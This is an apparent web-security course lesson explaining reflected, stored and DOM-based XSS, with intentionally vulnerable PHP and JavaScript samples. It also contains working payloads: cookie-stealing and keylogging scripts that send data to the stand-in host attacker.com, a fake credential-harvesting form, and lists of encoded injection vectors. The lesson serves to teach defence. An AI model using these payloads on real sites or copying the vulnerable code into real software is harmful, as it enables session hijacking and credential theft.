# Lesson 03 - Understanding XSS (Cross-Site Scripting) Attacks

**Duration**: 60 minutes

---

## Introduction: The Most Common Web Vulnerability

**Cross-Site Scripting (XSS)** has consistently ranked in the OWASP Top 10 for over a decade. It's one of the most common vulnerabilities found in web applications.

**Real-world impact**:
- **British Airways (2018)**: XSS attack led to theft of 380,000 credit card details, £20 million fine
- **eBay (2014)**: Stored XSS vulnerability affected millions of users
- **MySpace (2005)**: The "Samy" worm infected over 1 million profiles in 20 hours

Despite being well-understood, XSS remains prevalent because developers often forget to sanitize output or do it incorrectly.

---

## What is XSS?

**Cross-Site Scripting (XSS)** is when an attacker injects malicious JavaScript code into a web page, and that code executes in other users' browsers.

### The Simple Example

```php
// search.php - VULNERABLE CODE
<?php
$query = $_GET['q'];
?>
<h1>Search results for: <?= $query ?></h1>
```

**Normal use**:
```
URL: search.php?q=laptop
Display: Search results for: laptop
```

**Malicious use**:
```
URL: search.php?q=<script>alert('XSS')</script>
Display: Search results for:
Browser: Executes JavaScript alert!
```

The browser can't distinguish between your HTML and the attacker's HTML. It just executes everything.

### Why "Cross-Site"?

The attack is called "Cross-Site" because the malicious code runs in the context of your trusted site, but it was injected by an attacker from a different site (or different source).

The victim's browser thinks:
> "This code is from example.com, so I trust it and will execute it."

But actually, the code came from an attacker!

---

## The Three Types of XSS

### 1. Reflected XSS (Non-Persistent)

**Definition**: The malicious code is reflected back immediately in the response. It's not stored anywhere.

**How it works**:
1. Attacker creates a malicious URL
2. Attacker tricks victim into clicking it (email, social media, etc.)
3. Victim's browser sends request to vulnerable site
4. Site reflects the malicious code in the response
5. Victim's browser executes the code

**Example**:

```php
// profile.php - VULNERABLE
<?php
$name = $_GET['name'];
?>
<h1>Welcome <?= $name ?>!</h1>
```

**Attack URL**:
```
https://example.com/profile.php?name=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**What happens**:
1. Victim clicks the link
2. Page displays: "Welcome [script executes]"
3. JavaScript steals the victim's cookies
4. Sends cookies to attacker's server
5. Attacker can now impersonate the victim

**Why it's dangerous**:
- Victims don't realize they're being attacked
- The URL looks like it's from a trusted site
- Can steal session cookies, credentials, personal data

### 2. Stored XSS (Persistent)

**Definition**: The malicious code is stored in the database and displayed to every user who views it.

**How it works**:
1. Attacker submits malicious code (comment, profile, post, etc.)
2. Application stores it in the database
3. Every time someone views that page, the code executes
4. All viewers are affected, not just one victim

**Example**:

```php
// comment.php - VULNERABLE
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    // Store in database - no sanitization!
    $db->query("INSERT INTO comments (text) VALUES (?)", [$comment]);
}

// Display comments
$comments = $db->query("SELECT * FROM comments")->fetchAll();
foreach ($comments as $comment) {
    // Displaying without sanitization - VULNERABLE!
    echo "<p>" . $comment['text'] . "</p>";
}
?>
```

**Attack**:
```
Attacker submits comment:
"Great article! <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
```

**What happens**:
1. Comment is stored in database with the script
2. **Every user** who views the page executes the script
3. All their cookies are sent to the attacker
4. The attack keeps working until someone fixes the code

**Why it's MORE dangerous**:
- Affects all users, not just one
- Attacker doesn't need to trick anyone into clicking a link
- Attack persists until removed
- Can spread like a worm (user posts, others view and get infected)

### 3. DOM-based XSS

**Definition**: The vulnerability exists in client-side JavaScript code that processes user input.

**How it works**:
1. JavaScript reads user input from URL, localStorage, etc.
2. JavaScript directly inserts it into the DOM
3. No server-side involvement needed

**Example**:

```html
<!-- page.html - VULNERABLE -->
<div id="message"></div>

<script>
// Read from URL hash
var message = window.location.hash.substring(1);

// Insert directly into DOM - VULNERABLE!
document.getElementById('message').innerHTML = message;
</script>
```

**Attack URL**:
```
https://example.com/page.html#<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**What happens**:
1. JavaScript reads the hash: `<img src=x onerror="...">`
2. Inserts it into the DOM with `innerHTML`
3. Browser creates the img tag
4. Image fails to load (src=x doesn't exist)
5. `onerror` handler executes the malicious code

**Why it's tricky**:
- Server never sees the attack (hash not sent to server)
- Can't be detected by server-side security tools
- Must be fixed in JavaScript code

---

## What Can Attackers Do with XSS?

### 1. Steal Session Cookies

```javascript
// Steal cookies and send to attacker
fetch('https://attacker.com/steal?cookie=' + document.cookie);

// Or using image tag
new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
```

**Impact**: Attacker can impersonate the victim and access their account.

### 2. Steal Credentials

```javascript
// Inject a fake login form
document.body.innerHTML = `
    <h1>Session Expired - Please Login</h1>
    <form action="https://attacker.com/steal" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
`;
```

**Impact**: Users think they're logging into the real site but send credentials to the attacker.

### 3. Keylogging

```javascript
// Record every keystroke
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
});
```

**Impact**: Every key pressed on the page is sent to the attacker, including passwords.

### 4. Deface the Website

```javascript
// Replace entire page content
document.body.innerHTML = '<h1>HACKED BY XYZ</h1>';

// Or modify specific elements
document.querySelector('h1').textContent = 'HACKED!';
```

**Impact**: Damages reputation and user trust.

### 5. Redirect to Phishing Site

```javascript
// Redirect after 3 seconds
setTimeout(function() {
    window.location = 'https://fake-example.com/login';
}, 3000);
```

**Impact**: Users are sent to a fake site that looks real and enter their credentials.

### 6. Perform Actions as the Victim

```javascript
// Transfer money (if it's a banking app)
fetch('/api/transfer', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        to: 'attacker_account',
        amount: 1000
    })
});

// Post a message as the victim
fetch('/api/posts', {
    method: 'POST',
    body: 'Check out this link! [malicious link]'
});

// Follow the attacker (social media)
fetch('/api/follow', {
    method: 'POST',
    body: JSON.stringify({ user_id: 'attacker' })
});
```

**Impact**: Any action the victim can perform, the attacker can perform as them.

### 7. Worm (Self-Propagating XSS)

```javascript
// Famous "Samy" MySpace worm (simplified)
// 1. Steal user's profile access
// 2. Add "Samy is my hero" to their profile
// 3. Add the same XSS code to their profile
// 4. When friends view the profile, they get infected
// 5. The worm spreads exponentially

// Simplified example:
fetch('/api/profile/update', {
    method: 'POST',
    body: 'bio=Samy is my hero<script>/* worm code */</script>'
});
```

**Impact**: One infected profile can spread to millions in hours.

---

## Real-World XSS Examples

### Example 1: Comment System

**Vulnerable code**:
```php
<?php
// post-comment.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    $postId = $_POST['post_id'];

    $db->query("INSERT INTO comments (post_id, text) VALUES (?, ?)", [$postId, $comment]);
    header("Location: post.php?id=$postId");
    exit;
}

// post.php
$postId = $_GET['id'];
$comments = $db->query("SELECT * FROM comments WHERE post_id = ?", [$postId])->fetchAll();

foreach ($comments as $comment) {
    // VULNERABLE - No sanitization!
    echo "<div class='comment'>" . $comment['text'] . "</div>";
}
```

**Attack**:
```html
Attacker submits comment:
<script>
// Steal all cookies from everyone viewing this page
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Result**: Everyone who views this post has their cookies stolen.

### Example 2: Search Results

**Vulnerable code**:
```php
<?php
// search.php
$query = $_GET['q'];
$results = searchDatabase($query);
?>

<h1>Search results for: <?= $query ?></h1>

<?php foreach ($results as $result): ?>
    <div><?= $result['title'] ?></div>
<?php endforeach; ?>
```

**Attack URL**:
```
https://example.com/search.php?q=<script>alert(document.cookie)</script>
```

**Attacker creates phishing email**:
```
Subject: You won a prize!

Click here to claim: https://example.com/search.php?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Result**: Victim clicks, their cookies are stolen, attacker hijacks their session.

### Example 3: User Profile

**Vulnerable code**:
```php
<?php
// profile.php
$userId = $_GET['id'];
$user = $db->query("SELECT * FROM users WHERE id = ?", [$userId])->fetch();
?>

<h1><?= $user['name'] ?></h1>
<p>Bio: <?= $user['bio'] ?></p>
<p>Website: <a href="<?= $user['website'] ?>"><?= $user['website'] ?></a></p>
```

**Attack**:
```
Attacker updates their profile:
- name: <script>alert('XSS')</script>
- bio: Hello <img src=x onerror="alert('XSS')">
- website: javascript:alert('XSS')
```

**Result**:
- Anyone viewing the attacker's profile executes the malicious code
- Multiple injection points = multiple ways to exploit

### Example 4: Error Messages

**Vulnerable code**:
```php
<?php
// login.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];

    // Check if user exists
    if (!userExists($username)) {
        // VULNERABLE - Reflecting user input in error!
        echo "<p class='error'>User '$username' not found</p>";
    }
}
```

**Attack**:
```
Attacker submits username: ' <script>alert('XSS')</script>

Error displays: User '' not found
Script executes!
```

**Result**: Even error messages can be attack vectors!

---

## Why XSS is So Dangerous

### 1. Bypasses Same-Origin Policy

The browser's security model (Same-Origin Policy) prevents a script from attacker.com from accessing data on example.com.

**But with XSS**:
- The malicious script runs in the context of example.com
- Browser thinks it's legitimate code from example.com
- It has full access to cookies, localStorage, and can make requests

### 2. Can't Be Prevented by HTTPS

HTTPS protects data in transit, but once the malicious code is on the page, it runs with full privileges regardless of HTTPS.

### 3. Hard for Users to Detect

Users see:
```
URL: https://example.com/search.php?q=laptop
```

They don't see:
```
URL: https://example.com/search.php?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

Even if they check the URL, it's from a trusted domain!

### 4. Affects All Users

One stored XSS vulnerability can affect thousands or millions of users.

---

## XSS Attack Vectors

Attackers have many ways to inject malicious code:

### Script Tags

```html
<script>alert('XSS')</script>
<script src="https://attacker.com/malicious.js"></script>
```

### Event Handlers

```html
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<input type="text" onfocus="alert('XSS')" autofocus>
<svg onload="alert('XSS')">
<a href="#" onclick="alert('XSS')">Click</a>
<div onmouseover="alert('XSS')">Hover</div>
```

### JavaScript Protocol

```html
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')"></iframe>
```

### Data URLs

```html
<img src="data:text/html,<script>alert('XSS')</script>">
<object data="data:text/html,<script>alert('XSS')</script>">
```

### SVG

```html
<svg><script>alert('XSS')</script></svg>
<svg><animate onbegin="alert('XSS')" attributeName=x dur=1s>
```

### Style Attributes

```html
<div style="background:url('javascript:alert(\'XSS\')')">
<style>@import'javascript:alert("XSS")';</style>
```

### Encoded Payloads

```html
<!-- HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

<!-- URL encoding -->
<img src=x onerror="alert%28%27XSS%27%29">

<!-- Unicode -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074('XSS')">
```

**Key point**: There are hundreds of ways to inject XSS. You can't blacklist them all. You must whitelist safe output!

---

## Testing for XSS Vulnerabilities

### Basic Test Payloads

```javascript
// Alert box (harmless test)
<script>alert('XSS')</script>

// Image with error handler
<img src=x onerror="alert('XSS')">

// Polyglot (works in many contexts)
'"><script>alert('XSS')</script>

// Event handler
<body onload=alert('XSS')>

// SVG
<svg onload=alert('XSS')>
```

### Where to Test

Test every input field:
- [ ] Search boxes
- [ ] Comment forms
- [ ] Profile fields (name, bio, location, etc.)
- [ ] URL parameters
- [ ] Contact forms
- [ ] File upload names
- [ ] Cookie values
- [ ] Referer headers
- [ ] Error messages

### Manual Testing Process

1. **Identify input points**: Forms, URLs, cookies
2. **Submit test payload**: `<script>alert('XSS')</script>`
3. **Check if executed**: Does alert box appear?
4. **Try variations**: Different payloads, encoding
5. **Test stored vs reflected**: Is it saved in database?
6. **Check different pages**: Does it appear elsewhere?

---

## Why XSS Happens

### Developer Mistakes

1. **Forgetting to sanitize**: Most common cause
```php
// FORGOT to sanitize!
echo $user_input;
```

2. **Sanitizing too late**: Sanitizing when storing instead of when displaying
```php
// WRONG - Sanitize on storage
$comment = htmlspecialchars($_POST['comment']);
$db->query("INSERT INTO comments (text) VALUES (?)", [$comment]);

// Later... displays double-encoded entities
```

3. **Wrong sanitization function**: Using the wrong function for the context
```php
// WRONG - urlencode for HTML context
echo urlencode($user_input);
```

4. **Trusting "safe" sources**: Assuming database data is safe
```php
// WRONG - Data from database can still be malicious!
echo $db_result['comment']; // No sanitization!
```

5. **Client-side only validation**: Relying on JavaScript validation
```javascript
// USELESS - Can be bypassed
if (input.includes('<script>')) {
    alert('No scripts allowed!');
}
```

---

## Key Takeaways

1. **XSS allows attackers to run JavaScript in victims' browsers**
2. **Three types**: Reflected (non-persistent), Stored (persistent), DOM-based
3. **Stored XSS is most dangerous**: Affects all users who view the page
4. **Attackers can**: Steal cookies, credentials, perform actions, deface pages, spread worms
5. **Many injection vectors**: Scripts, event handlers, protocols, encoded payloads
6. **Test all input points**: Forms, URLs, cookies, headers, errors
7. **Common causes**: Forgetting sanitization, wrong sanitization, trusting database data

---

## What's Next?

Now that you understand how XSS attacks work and why they're so dangerous, the next lesson will teach you **how to prevent them**.

You'll learn:
- The correct way to sanitize output
- Context-specific encoding
- Content Security Policy (CSP)
- Security headers
- Building XSS-proof applications

Prevention is actually simpler than you might think - but you must do it consistently and correctly!
